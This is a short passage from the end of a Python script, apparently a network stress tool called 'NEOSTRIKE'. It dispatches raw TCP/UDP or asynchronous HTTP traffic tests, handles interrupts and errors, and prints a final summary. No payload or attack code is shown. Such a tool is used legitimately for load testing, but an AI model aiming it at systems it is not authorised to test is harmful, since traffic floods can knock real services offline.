                  screen=True) as live:
            if cfg.method in ("TCP", "UDP"):
                run_raw_test(cfg, stats, stopper, logger, live, layout)
            else:
                asyncio.run(
                    run_http_test(cfg, stats, stopper, logger, live, layout)
                )
    except KeyboardInterrupt:
        stopper.request_stop()
    except Exception as exc:
        logger.exception("Fatal error in main loop: %s", exc)
        console.print(f"[ns.bad]Fatal error: {exc}[/]")
    finally:
        stopper.request_stop()

    final_summary(cfg, stats, logger, log_path)
    logger.info("NEOSTRIKE session ended.")
    return 0


if __name__ == "__main__":
    sys.exit(main())